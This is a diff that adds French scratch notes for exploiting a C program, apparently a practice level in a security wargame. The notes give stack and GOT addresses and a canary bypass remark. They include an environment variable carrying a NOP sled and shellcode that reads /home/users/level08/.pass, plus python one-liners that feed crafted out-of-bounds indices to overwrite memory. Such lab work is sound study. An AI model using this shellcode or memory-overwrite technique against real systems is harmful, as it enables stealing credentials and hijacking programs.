@@ -1,4 +1,3 @@
-
 int read_number(unsigned int tab[25])
 {
 	unsigned int i;
@@ -96,3 +95,62 @@ int main(int ac, char **argv, char **argenv)
 	}
 	return (0);
 }
+
+buffer : 0xffffd544
+
+0x2ABB
+
+eip de store_number : 0xffffd51c
+
+(buffer - eip) / 4 = 10
+
+plt :
+0x0804a000 printf
+0x0804a004 fflush
+0x0804a008 getchar
+0x0804a00c fgets
+0x0804a010 __stack_chk_fail
+0x0804a014 puts
+0x0804a018 __gmon_start__
+0x0804a01c __libc_start_main
+0x0804a020 memset
+0x0804a024 __isoc99_scanf
+
+addr = buff + index * 4
+
+index * 4 = addr - buff
+index  = (addr - buff) / 4
+
+3254860936
+
+3254860939
+
+17674
+
+134520844
+
+pour peter le canary : 106
+
+system : 0xf7e6aed0 - -135876912
+
+export BINSH=`python -c "print '\x90' * 10000 + '\xeb''\x2d''\x31''\xc0''\xb0''\x05''\x5b''\x31''\xc9''\x31''\xd2''\x66''\xba''\xff''\x01''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\x31''\xc0''\xb0''\x03''\x31''\xd2''\xb2''\x29''\xcd''\x80''\x89''\xc2''\x31''\xc0''\xb0''\x04''\x31''\xdb''\xb3''\x01''\xcd''\x80''\xc3''\xe8''\xce''\xff''\xff''\xff''\x2f''\x68''\x6f''\x6d''\x65''\x2f''\x75''\x73''\x65''\x72''\x73''\x2f''\x6c''\x65''\x76''\x65''\x6c''\x30''\x38''\x2f''\x2e''\x70''\x61''\x73''\x73'"`
+adresse du shellcode : 0xffffbaf5
+
+python -c print "'store\n' + '\xdc''\xfb''\xff''\xff' + '\n' + '3254860936\n' + 'store\n'
+
+python -c print "'store\n' + '-16419\n' + '3254860936\n' + 'store\n'
+
+2f 74 6d 70    2f 73 00 00
+
+70 6d 74 2f    00 00 73 2f
+
+
+
+adresse de tab : 
+0xffffd730 = -10447 = 4294956848
+
+adresse du truc dans la plt :
+0x0804a010  = 134520848
+
+3254858419
+-135876912
